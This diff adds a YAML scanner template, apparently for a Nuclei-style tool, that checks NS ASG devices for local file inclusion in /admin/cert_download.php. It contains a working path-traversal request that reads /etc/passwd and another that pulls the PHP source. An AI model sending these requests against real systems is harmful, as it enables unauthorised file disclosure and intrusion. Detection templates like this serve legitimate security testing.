@@ -1,0 +1,26 @@
+id: nsasg-arbitrary-file-read
+name: NS ASG - Local File Inclusion
+severity: high
+confidence: tentative
+description: NS ASG is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- nsasg
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd
+  matchers: &id001
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: body
+    words:
+    - $certfile
+    - application/pdf
+  condition: or
+- method: GET
+  path: /admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php
+  matchers: *id001
+  condition: or
